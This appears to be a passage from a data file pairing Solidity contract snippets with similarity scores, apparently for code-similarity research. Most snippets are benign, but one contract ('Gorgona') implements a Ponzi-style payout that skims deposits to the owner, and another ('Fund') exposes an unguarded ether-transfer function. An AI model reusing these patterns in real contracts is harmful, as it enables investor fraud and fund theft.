}",0.5059628239273726,"contract Mintable is StandardToken {
    
    
    event Issuance(uint256 _amount);
    
    
    function issue(address _to, uint256 _amount)
        internal
    {
        _totalSupply = _totalSupply + _amount;
        balances[_to] = balances[_to] + _amount;

        emit Issuance(_amount);
        emit Transfer(this, _to, _amount);
    }
}"
"contract TestContract {

  uint private dummyTargetDontUpdate; 
  uint public value; 
  bool public wasConstructed; ",0.5875616537104172,"contract ERC20 {
    uint public totalSupply;
   
    function transfer(address to, uint value) public returns(bool ok);  
}"
"contract ImageInfo{
   mapping(address=>Image[]) private images;
   struct Image{
      string imageHash;
      string ipfsInfo;
   }
   function uploadImage(string hash, string ipfs) public{
       images[msg.sender].push(Image(hash,ipfs)); 
   }
}",0.5437452091589635,"contract CodexBeta {
    struct MyCode {
        string code;
    }
    event Record(string code);
    function record(string code) public {
        registry[msg.sender] = MyCode(code);
    }
    mapping (address => MyCode) public registry;
}"
"contract Chat
{
    struct User {
        uint40 time;
        address user;
        address myAddress;
        address owner;
        string message;
        string response;
    }

    User public message;

    function Chat(address _uw, address _a, string _m, string _r) 
    {
        message = User ({
            user: _uw,
            myAddress: _a,
            message: _m,
            response:_r,
            owner: msg.sender,
            time: now
            });
    }
}",0.5955346224698176,"contract CryptoPeopleName {

    address owner;

    mapping(address => string) private nameOfAddress;

  

    function CryptoPeopleName() public{

        owner = msg.sender;

    }

    

    function setName(string name) public {

        nameOfAddress[msg.sender] = name;

    }

    

    function getNameOfAddress(address _address) public view returns(string _name){

        return nameOfAddress[_address];

    }

    

}"
"contract A {
    function makeCall(address addressB){
         AbstractB(addressB).getX.gas(0);
    }
}",0.5928607140616384,"contract Agent {
    
    function g(address addr) payable {
        addr.transfer(msg.value);
    }

}"
"contract ArrayOfBytes32 {
    address creator;
    bytes32[10] bytesArray; 
  
    function ArrayRR() 
    {
        creator = msg.sender;
        uint8 x = 0;
        while(x < bytesArray.length)
        {
            bytesArray[x] = ""myString""; 
            x++;
        }
    }
   
    function getArray() constant returns (bytes32[10])
    {
        return bytesArray;
    }
    
    function getValue(uint8 x) constant returns (bytes32)
    {
        return bytesArray[x];
    }
}",0.5743543880144496,"contract PricingStrategy {

  
  function isPricingStrategy() public constant returns (bool) {
    return true;
  }

  
  function isSane(address crowdsale) public constant returns (bool) {
    return true;
  }

  
  function calculatePrice(uint value, uint tokensSold, uint weiRaised, address msgSender) public constant returns (uint tokenAmount);
}"
"contract Patient {
         mapping(address=>doctorStruct[]) public doctorDetails;
         struct doctorStruct {
             address doctorAccountAddr;
             bool canAddData;
         }
}",0.5075479719751118,"contract TokenApprovalController {

  function approve(address _account, address _spender, uint256 _amount) public returns (bool _success){}

}"
"contract Lease {

  function Lease(
                address _owner,
                address _tenant,
                uint _startDate,
                uint _fee,
                uint _deposit)
    public {
    require(_owner != _tenant);
    require(_startDate > now);
    require(_fee > 0);
    require(_deposit >= fee * 2);
  }
}",0.5895615732553964,"contract DepositWalletInterface {

    function deposit(address _asset, address _from, uint256 amount) public returns (uint);

    function withdraw(address _asset, address _to, uint256 amount) public returns (uint);

}"
contract A { uint a; ... },0.5899226991281914,"contract NGNT is V1 {

}"
"contract Notes {
    struct notes {
        string id;
        string content;
        address owner;
        bool isCreated;
        bool isDeleted;
        uint256 timestamp;
                }
    mapping(address => mapping(string =>notes)) private userNotes;

    ",0.5683952831082572,"contract ISTProxy {



    

    function deployToken(string _name, string _symbol, uint8 _decimals, string _tokenDetails, address _issuer, bool _divisible, address _polymathRegistry)

        public returns (address);

}"
"contract factory {

  event LogContractCreated(address generated);

  function createContract() public returns(bool success)
  {
    Generated g = new Generated();
    LogContractCreated(g); 
    return true;
  }
}",0.5951801601605412,"contract ControlledI is OwnedI {



    function getController() public view returns(address controller);

    function changeController(address newController) public returns(bool success);

}"
"contract Call {
    Test test;
    function addTest(uint256 _newNum){
        test = new Test(_newNum)
    }
}",0.5716613954626187,"contract Dragon {
    function transfer( address _to, uint256 _amount )returns(bool ok);
}"
"contract Stack {

    struct xxxx {

    bytes32 id;
    bool x;
    bool w;
    uint date;

    bytes32 a;
    bytes32 b;
    bytes32 c;
    bytes32 d;
    bytes32 e;


    bytes32 f;
    bytes32 g;
    bytes32 h;

    uint j;
    uint k;

    bool active;
    bool b1;
    bool b2;

    bytes32 added;
  }

  
}",0.5069550158584315,"contract TransferableMultsig {

    

    function execute(

        uint8[]   sigV,

        bytes32[] sigR,

        bytes32[] sigS,

        address   destination,

        uint      value,

        bytes     data

        )

        external;

    

    function transferOwnership(

        uint8[]   sigV,

        bytes32[] sigR,

        bytes32[] sigS,

        uint      _threshold,

        address[] _owners

        )

        external;

}"
"contract HelloWorld {
        event Print(string out);
        function() { Print(""Hello, World!""); }
}",0.5639143232813899,"contract HelloWorld {

  string public helloWorld = ""Matthieu HOURDEBAIGT"";

}"
"contract ReservedTokensFinalizeAgent is FinalizeAgent {
  using SafeMathLibExt for uint;
  CrowdsaleTokenExt public token; 
  CrowdsaleExt public crowdsale; ",0.5862686489496602,"contract CrowdsaleConstructor is MintedCrowdsale {
  constructor(uint256 _rate, address _wallet, MintableToken _token)
  public Crowdsale(_rate, _wallet, _token){}
}"
"contract A {
    struct ItemAddress {
        uint16 ordID;
    }

    ItemAddress[] public itemAddresses;

    function createItemAddress(
        uint16 _ordID
    )
        external
        returns
    (
        uint256 itemAddressID
    )
    {
        ItemAddress memory _itemAddress = ItemAddress({
            ordID: _ordID
        });

        itemAddressID = itemAddresses.push(_itemAddress) - 1;

        return itemAddressID;
    }

    function getItemAddress(uint16 id)
        external
        view
        returns
    (
        uint16 _ordID
    )
    {
        ItemAddress storage itemAddress = itemAddresses[id];

        _ordID = itemAddress.ordID;
    }

    function getItemLength()
        public
        view
        returns (uint256)
    {
        return itemAddresses.length;
    }
}",0.5723683498976522,"contract TokenDB is Owned {
    
    function transfer(address _from, address _to, uint256 _amount) external returns(bool _success) {}
    function bulkTransfer(address _from, address[] _to, uint256[] _amount) external returns(bool _success) {}
    function setAllowance(address _owner, address _spender, uint256 _amount) external returns(bool _success) {}
    
    function getAllowance(address _owner, address _spender) public view returns(bool _success, uint256 _remaining) {}
    function balanceOf(address _owner) public view returns(bool _success, uint256 _balance) {}
}"
"contract beer{
   struct beerToken{
      uint deliveryDate;
      uint256 quantity;
      ...
   }
   mapping(address=>beer) beers;
}",0.5685043213959935,"contract investor is InCodeWeTrust {

  address internal owner; 



  mapping(address => uint256) balances;

}"
"contract Test{

struct structGame
{
    uint256 value;
    string name;
    bool active;
}

mapping(uint256=>structGame) public mapGame;

function AddGame(uint id,uint value,string name){
    structGame memory game = structGame(value,name,true);
    mapGame[id] = game;
}

function GetGame(uint id) view returns (uint value,string name, bool active)
{
    return (mapGame[id].value,mapGame[id].name,mapGame[id].active);
}

function deleteGame(uint id){
    delete mapGame[id];
}

modifier gameExist(uint id)
{
    require (mapGame[id].active);
    _;
}

function GetGameVerified(uint id) view gameExist(id) returns (uint value,string name, bool active)
{
     return (mapGame[id].value,mapGame[id].name,mapGame[id].active);
}


}",0.572420531396312,"contract TokenMintBurnableERC20Token is ERC20 {

    string private _name;
    string private _symbol;
    uint8 private _decimals;

    constructor(string memory name, string memory symbol, uint8 decimals, uint256 totalSupply, address tokenOwnerAddress) public payable {
      _name = name;
      _symbol = symbol;
      _decimals = decimals;

      
      _mint(tokenOwnerAddress, totalSupply);
    }

    
    function burn(uint256 value) public {
      _burn(msg.sender, value);
    }

    

    
    function name() public view returns (string memory) {
      return _name;
    }

    
    function symbol() public view returns (string memory) {
      return _symbol;
    }

    
    function decimals() public view returns (uint8) {
      return _decimals;
    }
}"
"contract PersonMartyr{
    function PersonMartyr(){
        var person = Person(0x..)
        person.setFirstName(...);
        person.setLastName(....);
        selfdestruct(msg.sender);
    }
}",0.5016520366221813,"contract mortal
{
    address owner;

    function mortal() { owner = msg.sender; }
    function kill() { if(msg.sender == owner) selfdestruct(owner); }
}"
"contract DebugEvents
{
    event Debug(string message);

    modifier requireDebugModifier(bool arg, string message)
    {
        if (!arg)
        {
            Debug(message);
            return;
        }
        _;

    }

    modifier requireModifier(bool arg)
    {
        require(arg);
        _;
    }
}",0.5241803195791678,"contract Bulletin {
    
    string public message = """";
    address public owner;
    
    function Bulletin(){
        owner = msg.sender;
    }
    
    function setMessage(string _message){
        require(msg.sender == owner);
        message = _message;
    }
}"
"contract Test {
    uint256[] public foo;

    constructor() public {
        uint256[] memory bar = new uint256[](3);
        bar[0] = 1;
        bar[1] = 2;
        bar[2] = 3;

        foo = bar;
    }
}",0.5971795966227914,"contract Jug {
    struct Ilk {
        uint256 duty;
        uint256  rho;
    }

    mapping (bytes32 => Ilk) public ilks;

    function drip(bytes32) public returns (uint);
}"
"contract A {

    
    function deepStack
    (
        uint8 _a,
        uint8 _b,
        uint8 _c,
        uint8 _d,
        uint16 _e,
        uint16 _f,
        uint16 _g,
        uint16 _h,
        uint32 _i,
        uint32 _j,
        uint32 _k,
        uint32 _l,
        uint64 _m,
        uint64 _n,
        uint64 _o,
        uint64 _p,
        uint128 _q
    )
        public
        returns (bool success)
    {
        return true;
    }

    
    function deepStackSolution
    (
        uint8[] _aToD,
        uint16[] _eToH,
        uint32[] _iToL,
        uint64[] _mToP,
        uint128 _q
    )
        public
        returns (bool success)
    {
        return true;
    }

}",0.5918549839963743,"contract SafeMath {

    

    constructor() public{

    }



       

    function safeAdd(uint256 a, uint256 b) internal pure returns (uint256) {

        uint c = a + b;

        assert(c >= a && c >= b);

        return c;

    }



    

    function safeSub(uint256 a, uint256 b) internal pure returns (uint256) {

        uint c = a - b;

        assert(b <= a && c <= a);

        return c;

    }



    function safeMul(uint256 a, uint256 b) internal pure returns (uint256) {

        uint c = a * b;

        assert(a == 0 || (c / a) == b);

        return c;

    }



}"
"contract SplitPayment
{
    uint constant shareSum = 1000000000;

    address public A = 0xaaa...; 
    uint256 public A_share  = 111111111;

    address public B = 0xbbb...;
    uint256 public B_share  = 222222222;

    address public C = 0xccc...;

    function() payable public
    {
        uint256 balance = address(this).balance;

        uint toA = (balance * A_share) / shareSum;
        uint toB = (balance * B_share) / shareSum;
        uint toC = balance - (toA + toB);

        A.transfer(toA);

        B.transfer(toB);

        C.transfer(toC);

        assert(address(this).balance == 0);
    }
}",0.5982203562738497,"contract ERC223Basic {

    uint256 public totalSupply;

    function balanceOf(address who) public constant returns (uint256);

    function transfer(address to, uint256 value) public returns (bool);

    function transfer(address to, uint256 value, bytes data) public returns (bool);

    function transfer(address to, uint256 value, bytes data, string custom_fallback) public returns (bool);

    event Transfer(address indexed from, address indexed to, uint256 value);

}"
"contract Access1{
    address storgeContractAddress = ""0xcd53170a761f024a0441eb15e2f995ae94634c06"";
    Storage storage;    
    function Access1(){
     storage =  Storage(storgeContractAddress);
    }
    function getEntityCount()public constant returns(uint entityCount){
        uint count=storage.getEntityCount.call();
        return count;
    }
}",0.5398048019956682,"contract ILoanLogic {



	function getTotalPledgeAmount(address token, address account) public constant returns (uint256);



	function hasUnpaidLoan(address account) public constant returns (bool);



	function getTotalBorrowAmount(address _token) public constant returns (uint256);



}"
"contract Management{

struct studentInfo {
    string name;
    string birthdate;
    string department;
    string location;
    string email;
    uint256 mobile_no;
}

mapping(uint256 => studentInfo) students;
uint256[] public studentIds;

    function registerStudent(string memory name, string memory birthdate, string memory department, 
                             string memory location, string memory email, uint256 id, uint256 mobile_no) public {
        studentInfo storage newStudent = students[id];
        newStudent.name = name;
        newStudent.birthdate = birthdate;
        newStudent.department = department;
        newStudent.location = location;
        newStudent.email = email;
        newStudent.mobile_no = mobile_no;
        studentIds.push(id);
    }

    function getStudent(uint256 id) public view returns (string memory, string memory, string memory, 
                                                    string memory, string memory, uint256){
        studentInfo storage s = students[id];
        return (s.name,s.birthdate,s.department,s.location,s.email,s.mobile_no);
    }
}",0.5590120821367185,"contract DiaOracle {

	address owner;



	struct CoinInfo {

		uint256 price;

		uint256 supply;

		uint256 lastUpdateTimestamp;

		string symbol;

	}



	mapping(string => CoinInfo) diaOracles;

	

	event newCoinInfo(

		string name,

		string symbol,

		uint256 price,

		uint256 supply,

		uint256 lastUpdateTimestamp

	);

    

	constructor() public {

		owner = msg.sender;

	}



	function changeOwner(address newOwner) public {

		require(msg.sender == owner);

		owner = newOwner;

	}

    

	function updateCoinInfo(string name, string symbol, uint256 newPrice, uint256 newSupply, uint256 newTimestamp) public {

		require(msg.sender == owner);

		diaOracles[name] = (CoinInfo(newPrice, newSupply, newTimestamp, symbol));

		emit newCoinInfo(name, symbol, newPrice, newSupply, newTimestamp);

	}

    

	function getCoinInfo(string name) public view returns (uint256, uint256, uint256, string) {

		return (

			diaOracles[name].price,

			diaOracles[name].supply,

			diaOracles[name].lastUpdateTimestamp,

			diaOracles[name].symbol

		);

	}

}"
"contract BalanceChecker {
  function checkBalances (address [] memory addresses, uint [] memory previousBalances)
  public view
  returns (address [] memory changedAddresses, uint [] memory currentBalances) {
    uint count = addresses.length;
    require (previousBalances.length == count);

    address [] memory tempAddresses = new address [] (count);
    uint [] memory tempBalances = new uint [] (count);

    uint changedCount = 0;
    for (uint i = 0; i < count; i++) {
      address a = addresses [i];
      uint pb = previousBalances [i];
      uint cb = a.balance;
      if (cb != pb) {
        tempAddresses [changedCount] = a;
        tempBalances [changedCount] = cb;
        changedCount += 1;
      }
    }

    changedAddresses = new address [] (changedCount);
    currentBalances = new uint [] (changedCount);

    for (uint i = 0; i < changedCount; i++) {
      changedAddresses [i] = tempAddresses [i];
      currentBalances [i] = tempBalances [i];
    }
  }
}",0.5627592209375601,"contract ComponentContainer is ComponentContainerInterface {



    function setComponent(bytes32 _name, address _componentAddress) internal returns (bool success) {

        require(_componentAddress != address(0));

        components[_name] = _componentAddress;

        return true;

    }



    function getComponentByName(bytes32 _name) public view returns (address) {

        return components[_name];

    }



    function getComponents(bytes32[] _names) internal view returns (address[]) {

        address[] memory addresses = new address[](_names.length);

        for (uint i = 0; i < _names.length; i++) {

            addresses[i] = getComponentByName(_names[i]);

        }



        return addresses;

    }



    function setComponents(bytes32[] _names, address[] _providerAddresses) internal returns (bool success) {

        require(_names.length == _providerAddresses.length);

        require(_names.length > 0);



        for (uint i = 0; i < _names.length; i++ ) {

            setComponent(_names[i], _providerAddresses[i]);

        }



        return true;

    }

}"
"contract Origin {

    struct OriginInfo
    {
        string airportName;
        uint32 checkInTime; 
        uint8 bagWeight;
        address clientAddress;
        bool itsHere;
    }
    mapping (uint256 => OriginInfo) origins;
    uint256 public originNonce;

    constructor() public {
        originNonce = 1;
    }

    function insertOrigin(string _airportName, uint32 _checkInTime, uint8 _bagWeight, bool _itsHere) 
        external 
    {
        origins[originNonce] = OriginInfo(_airportName, _checkInTime, _bagWeight, msg.sender, true);
        originNonce += 1;
    }

    function getOrigin(uint256 _originId) 
        private 
        constant 
        returns (string, uint32, uint8, address, bool) 
    {
        OriginInfo memory origin = origins[_originId];
        return (
            origin.airportName,
            origin.checkInTime, 
            origin.bagWeight, 
            origin.clientAddress, 
            origin.itsHere
        );
    }
}",0.5415109026985107,"contract Neulaut {



    uint256 public totalSupply = 7*10**27;

    address owner;

    string public name = ""Neulaut"";

    uint8 public decimals = 18;

    string public symbol = ""NUA"";

    mapping (address => uint256) balances;

    event Transfer(address indexed _from, address indexed _to, uint256 _value);

    



    constructor() public {

        owner = msg.sender;

        balances[owner] = totalSupply;

    }

    

    function() payable {

        revert();

    }



    function transfer(address _to, uint256 _value) public returns (bool success) {

        require(balances[msg.sender] >= _value);

        balances[msg.sender] -= _value;

        balances[_to] += _value;

        emit Transfer(msg.sender, _to, _value);

        return true;

    }



    function balanceOf(address _owner) constant public returns (uint256 balance) {

        return balances[_owner];

    }



}"
"contract complex {
  struct Data { uint a; bytes3 b; mapping(uint => uint) map; }
  mapping(uint => mapping(bool => Data[])) public data;
}",0.5935729023409827,"contract Spotter {
    struct Ilk {
        PipInterface pip;
        uint256 mat;
    }

    mapping (bytes32 => Ilk) public ilks;

    uint256 public par;

}"
"contract A {
    event LOG(uint _num);
}",0.5369677142169177,contract modularLong is LOLevents {}
"contract C {
    uint8 constant x = 137;
    uint y;
    constructor () public {
       y = 1 + x;
    }
 }",0.5769117565753166,"contract FiatContract {

    function USD(uint _id) constant public returns (uint256);

}"
"contract Fund{
    uint startDate;
    uint endDate;
    uint totalPrizePool;
    uint[] indexes;
    uint num;
    uint payDay;
    uint nextCampaignId;
    uint reprocessLock;
    address owner;

    function Fund(){
        startDate = now;
        endDate   = now + 12 minutes;
        payDay = endDate;
        reprocessLock = 0;
        owner = msg.sender;
        totalPrizePool = 0;
    }

    mapping (address => uint) phoneBook;
    mapping (uint => Payment) payment;

    struct Payment {
    uint amount;
    uint dateOfPayment;
    uint paymentsCount;
    address payOutAddr;
    }

    event enrolled(address payoutAddress, address sender, uint dateOfTransaction);
    event checker(address adr, uint amount, uint date, int paycount);
    modifier validateIfContractOpen(){ if(startDate + 30 minutes < now ) revert(); _; }
    modifier validateIfAlreadyExist(address payOutAddr){ if(payment[phoneBook[payOutAddr]].paymentsCount != 0) revert(); _; }
    modifier validateMsg(){ if(msg.value != 0.1 ether) revert(); _; }

    function enroll(address payOutAddr) payable
    validateMsg()
    validateIfContractOpen()
    validateIfAlreadyExist(payOutAddr)
    {
        phoneBook[payOutAddr] = nextCampaignId;

        payment[phoneBook[payOutAddr]].payOutAddr = payOutAddr;
        payment[phoneBook[payOutAddr]].amount += msg.value;
        payment[phoneBook[payOutAddr]].dateOfPayment = now;
        payment[phoneBook[payOutAddr]].paymentsCount += 1;

        enrolled(payOutAddr,msg.sender,now);

        nextCampaignId++;
    }

    event paymentAccepted(address payoutAddress, address sender, uint dateOfTransaction);



    function paycount(address addr){
        logger(payment[phoneBook[addr]].paymentsCount);
    }

    modifier checkFee(address payOutAddr){
        uint lifeCycle = now - startDate;

        uint cycleOfContract = lifeCycle / 3 minutes; 
        uint begin = 3 minutes * cycleOfContract;
        uint end = begin + 3 minutes;

        int notPayedCycles = int(cycleOfContract - payment[phoneBook[payOutAddr]].paymentsCount);

        
        if(lifeCycle > begin && lifeCycle < end){

            uint semiTotalFee = 0.02 ether * uint(notPayedCycles) + (0.1 ether * uint(notPayedCycles));
            uint totalFee = 0.1 ether + semiTotalFee;
            logger(semiTotalFee);
            logger(totalFee);
            if(msg.value != totalFee){
                revert();
            }
            _;
        }
        else{
            revert();
            _;
        }

    }


    modifier validatePaymentCountAndDate(address payOutAddr){ if (payment[phoneBook[payOutAddr]].paymentsCount == 3 ||
    (now - startDate / 3 minutes) == payment[phoneBook[payOutAddr]].paymentsCount) revert(); _; }

    modifier checkIfenrolled(address payOutAddr){  if (payment[phoneBook[payOutAddr]].paymentsCount < 1 ) revert(); _;  }

    function deposit(address payOutAddr) payable
    checkFee(payOutAddr)
    validatePaymentCountAndDate(payOutAddr) 
    {
        payment[phoneBook[payOutAddr]].amount += msg.value;
        payment[phoneBook[payOutAddr]].dateOfPayment = now;

        uint moneyWithoutFee = msg.value - (0.02 ether * (((((now - startDate)/3 minutes) - payment[phoneBook[payOutAddr]].paymentsCount))));

        payment[phoneBook[payOutAddr]].paymentsCount += moneyWithoutFee / 0.1 ether;
        paymentAccepted(payment[phoneBook[payOutAddr]].payOutAddr, msg.sender, now);

    }

    modifier validateIfEnded(){ if (endDate > now && reprocessLock != 0) revert(); _; } 

    event push(address sila);

    function reproccess()
    validateIfEnded()
    {
        uint i = 0;
        uint j = 0;
        uint prizePool;
        while(payment[i].paymentsCount != 0){
            if(payment[i].paymentsCount != 3){
                prizePool += payment[i].amount;
                payment[i].amount = 0; 
                j++;
            }
            if(payment[i].paymentsCount == 3){
                worthy[payment[i].payOutAddr] = 1;
            }
            i++;
        }
        reprocessLock = 1;
        totalPrizePool = (prizePool/(i-j))/3;
    }


    mapping (address => uint) worthy;


    modifier isWorth(address payOutAddress){ if( worthy[payOutAddress] != (now - endDate)/3 minutes + 1) revert(); _; }
    modifier checkReprocessLock(){ if (reprocessLock != 1) revert(); _; }

    function withDraw(address payOutAddress)
    isWorth(payOutAddress)
    checkReprocessLock()
    {
        payOutAddress.transfer(0.1 ether + totalPrizePool);
        worthy[payOutAddress] += 1;
    }



    function checkReprocess(){
        logger(reprocessLock);
    }

    function giveFunds()payable{}


    function checkpayroll(){

    }



    modifier own(){ if(msg.sender != owner) revert(); _; }
    function die()
    own()
    {
        msg.sender.transfer(this.balance);
    }

    function paaa(address addr){

        addr.transfer(0.1 ether);

    }

}",0.5880666705829071,"contract Gorgona {

    address public owner;



    uint constant PAYOUT_PER_INVESTOR_INTERVAL = 10 minutes;

    uint constant INTEREST = 3;

    uint private PAYOUT_CUMULATIVE_INTERVAL = 10 minutes;

    uint private MINIMUM_INVEST = 10000000000000000 wei;



    uint depositAmount;

    uint investorCount;

    uint public payoutDate;

    uint public lastPaymentDate;



    struct investor

    {

        uint id;

        uint deposit;

        uint deposits;

        uint date;

        address referrer;

    }



    address[] public addresses;



    mapping(address => investor) public investors;



    event Invest(address addr, uint amount);

    event PayoutCumulative(uint amount, uint txs);

    event PayoutSelf(address addr, uint amount);

    event RefFee(address addr, uint amount);

    event Cashback(address addr, uint amount);



    modifier onlyOwner {if (msg.sender == owner) _;}



    constructor() public {

        owner = msg.sender;

        addresses.length = 1;

        payoutDate = now;

    }



    function() payable public {

        if (msg.value == 0) {

            return;

        }



        require(msg.value >= MINIMUM_INVEST, ""Too small amount, minimum 0.001 ether"");



        investor storage user = investors[msg.sender];



        if (user.id == 0) {

            user.id = addresses.length;

            addresses.push(msg.sender);

            investorCount ++;



            

            address referrer = bytesToAddress(msg.data);

            if (investors[referrer].deposit > 0 && referrer != msg.sender) {

                user.referrer = referrer;

            }

        }



        

        user.deposit += msg.value;

        user.deposits += 1;

        user.date = now;



        emit Invest(msg.sender, msg.value);

        depositAmount += msg.value;

        lastPaymentDate = now;



        

        owner.transfer(msg.value / 5);



        

        if (user.referrer > 0x0) {

            uint bonusAmount = (msg.value / 100) * INTEREST;

            user.referrer.transfer(bonusAmount);

            emit RefFee(user.referrer, bonusAmount);



            

            if (user.deposits == 1) {

                msg.sender.transfer(bonusAmount);

                emit Cashback(msg.sender, bonusAmount);

            }

        }

    }



    function payout(uint limit) public

    {

        require(now >= payoutDate + PAYOUT_CUMULATIVE_INTERVAL, ""too fast payout request"");



        uint investorsPayout;

        uint txs;

        uint amount;



        for (uint idx = addresses.length; --idx >= 1;)

        {

            address addr = addresses[idx];

            if (investors[addr].date + 24 hours > now) {

                continue;

            }



            amount = getInvestorUnPaidAmount(addr);

            investors[addr].date = now;



            if (address(this).balance < amount) {

                selfdestruct(owner);

                return;

            }



            addr.transfer(amount);



            investorsPayout += amount;

            if (++txs >= limit) {

                break;

            }

        }



        payoutDate = now;

        emit PayoutCumulative(investorsPayout, txs);

    }



    function payoutSelf(address addr) public

    {

        require(addr == msg.sender, ""You need specify your ETH address"");



        require(investors[addr].deposit > 0, ""deposit not found"");

        require(now >= investors[addr].date + PAYOUT_PER_INVESTOR_INTERVAL, ""too fast payment required"");



        uint amount = getInvestorUnPaidAmount(addr);

        require(amount >= 1 finney, ""too small unpaid amount"");



        investors[addr].date = now;

        if (address(this).balance < amount) {

            selfdestruct(owner);

            return;

        }



        addr.transfer(amount);



        emit PayoutSelf(addr, amount);

    }



    function getInvestorDeposit(address addr) public view returns (uint) {

        return investors[addr].deposit;

    }



    function getInvestorCount() public view returns (uint) {

        return investorCount;

    }



    function getDepositAmount() public view returns (uint) {

        return depositAmount;

    }



    function getInvestorDatePayout(address addr) public view returns (uint) {

        return investors[addr].date;

    }



    function getPayoutCumulativeInterval() public view returns (uint)

    {

        return PAYOUT_CUMULATIVE_INTERVAL;

    }



    function setDatePayout(address addr, uint date) onlyOwner public

    {

        investors[addr].date = date;

    }



    function setPayoutCumulativeInterval(uint interval) onlyOwner public

    {

        PAYOUT_CUMULATIVE_INTERVAL = interval;

    }



    function getInvestorUnPaidAmount(address addr) public view returns (uint)

    {

        return (((investors[addr].deposit / 100) * INTEREST) / 100) * ((now - investors[addr].date) * 100) / 1 days;

    }



    function bytesToAddress(bytes bys) private pure returns (address addr) {

        assembly {

            addr := mload(add(bys, 20))

        }

    }

}"
"contract StorageTest {
    uint256 a;
    uint256[2] b;

    struct Entry {
        uint256 id;
        uint256 value;
    }
    Entry c;
}",0.5765737009303658,"contract DnaMixer {
    function mixDna(uint256 dna1, uint256 dna2, uint256 seed) public pure returns (uint256);
}"
"contract project3{

address owner;

struct Users{
bytes32 companyName;
bytes32 role; 
bytes32 country; 
bytes32 city;
uint phoneNo;
bytes32 physicalAddress;}

constructor (uint _tokens)public{
owner=msg.sender;
}

modifier only_admin{
require(msg.sender==owner);
_;}

mapping(address=>Users)users;

address[] private stakeholders;

function addUsers(address _address, bytes32 _companyName,bytes32 _role, bytes32 
_country,
bytes32 _city, uint _phoneNo, bytes32 _physicalAddress)only_admin external{
var user= users[_address];
user.companyName=_companyName;
user.role=_role;
user.country=_country;
user.city=_city;
user.phoneNo=_phoneNo;
user.physicalAddress=_physicalAddress;
stakeholders.push(_address);}

function getUser(address _address)external constant 
returns(bytes32,bytes32,bytes32,bytes32,uint,bytes32){
return(users[_address].companyName,
users[_address].role,users[_address].country,
users[_address].city,users[_address].phoneNo,
users[_address].physicalAddress);}
}",0.5559793421747586,"contract InvestorsStorage {

    address private owner;



    mapping (address => Investor) private investors;



    struct Investor {

        uint deposit;

        uint checkpoint;

    }



    constructor() public {

        owner = msg.sender;

    }



    modifier onlyOwner() {

        require(msg.sender == owner);

        _;

    }



    function updateInfo(address _address, uint _value) external onlyOwner {

        investors[_address].deposit += _value;

        investors[_address].checkpoint = block.timestamp;

    }



    function updateCheckpoint(address _address) external onlyOwner {

        investors[_address].checkpoint = block.timestamp;

    }



    function d(address _address) external view onlyOwner returns(uint) {

        return investors[_address].deposit;

    }



    function c(address _address) external view onlyOwner returns(uint) {

        return investors[_address].checkpoint;

    }



    function getInterest(address _address) external view onlyOwner returns(uint) {

        if (investors[_address].deposit < 2420000000000000000) {

            return 242;

        } else {

            return 300;

        }

    }

}"
"contract NewToken{
    ERC20 public oldToken;
    address public addressToIgnore;

    function NewToken(address _oldTokenAdddress, address _addressToIgnore){
        oldTokenAddress=_oldTokenAddress;
        addressToIgnore=_addressToIgnore;
    }

    function upgradeTokens(uint amountToUpgrade){
        require(amountToUpgrade<=oldToken.balanceOf(msg.sender));
        require(amountToUpgrade<=allowance(msg.sender, this));
        require(msg.sender!=addressToIgnore);
        if(transferFrom(msg.sender, 0x0, amountToUpgrade)){
            
        }
    }
}",0.5728848629563397,"contract DonationWallet {



  address public owner = msg.sender;

  

  event Deposit(address sender, uint256 amount);

  

  function() payable public {

    

    require(msg.value > 0);

    

    

    if(msg.value > 1 szabo) {

        emit Deposit(msg.sender, msg.value);        

    }

    

    

    address(owner).transfer(msg.value);

  }

  

  

  function transferTokens(address tokenAddress, uint256 tokens) public returns(bool success) {

    require(msg.sender == owner);

    return ERC20Interface(tokenAddress).transfer(owner, tokens);

  }



}"
"contract C {
    uint constant x = 32**22 + 8;
    string constant text = ""abc""; 
}",0.5705813892120972,"contract ConnectAuth is Auth {
    string public constant name = ""Auth-v1"";
}"
"contract FancyContract {
    struct FancyStruct {
         address from;
         address to;
         mapping (address => uint256) balances;
    }

    FancyStruct public fancyStruct;

    function fancyFunction()
    public 
    {
        fancyStruct = FancyStruct({
            from: address(0x01),
            to: address(0x02)
        });
        fancyStruct.balances[address(0x01)] = 10;
        fancyStruct.balances[address(0x02)] = 20;
    }
}",0.5628635787863258,"contract UpgradedStandardToken is StandardToken{
    
    
    function transferByLegacy(address from, address to, uint value) public;
    function transferFromByLegacy(address sender, address from, address spender, uint value) public;
    function approveByLegacy(address from, address spender, uint value) public;
}"
"contract PushStruct {

    struct MyStruct {
        uint field1;
        uint field2;
    }

    MyStruct[] public myStructs;

    function pushStruct() 
        public
        returns(uint arrayLength) 
    {
        MyStruct memory m;
        m.field1 = 1;
        m.field2 = 2;
        myStructs.push(m);
        return myStructs.length;
    }
}",0.5298300901367529,"contract showNum {
    address owner = msg.sender;
    uint _num = 0;
    constructor(uint number) public {
        _num = number;
    }
    function setNum(uint number) public payable {
        _num = number;
    }
    function getNum() constant public returns(uint) {
        return _num;
    }
}"
"contract SoloMiningLogEvent {

    struct Wei {
        bool sign;
        uint256 value;
    }

    struct Par {
        bool sign;
        uint128 value;
    }

    struct BalanceUpdate {
        Wei deltaWei;
        Par newPar;
    }

    event LogDeposit(
        address indexed accountOwner,
        uint256 accountNumber,
        uint256 market,
        BalanceUpdate update,
        address from
    );

}",0.5918495931937563,"contract Token {



    

    function totalSupply() constant returns (uint256 supply) {}

    



    

    

    function balanceOf(address _owner) constant returns (uint256 balance) {}



    

    

    

    

    function transfer(address _to, uint256 _value) returns (bool success) {}







    event Transfer(address indexed _from, address indexed _to, uint256 _value);



}"
"contract Array{
    using Library for Library.data;
    mapping(address => Library.data) clusterContract;

    function addCluster(address id) returns(bool){
        if(clusterContract[id].flag != 1 ){ 
            clusterContract[id] = list;
            clusterContract[id].flag = 1;
            return true;
        }
        return false; 
    }
}",0.5419623152494161,"contract TeamBet{
uint minAmount;

string teamName;


BetContract ownerContract;

function showTeam() public view returns(string team){
return teamName;
}

function showOwnerContract() public view returns(address _ownerContract) {

return ownerContract;
}


}"
"contract Test {
       event Input(string desc, address _party, uint _input1, string _input2);  

     function somefunc(uint _input1, string _input2) returns(bool success){
        Input(""Input"",msg.sender,_input1,_input2);
      return true;
   }
}",0.5553512014631741,"contract Verifier{

function verifyTx(

uint[2],

uint[2],

uint[2][2],

uint[2],

uint[2],

uint[2],

uint[2],

uint[2],

address

) public pure returns (bool){}











function getInputBits(uint, address) public view returns(bytes8){}

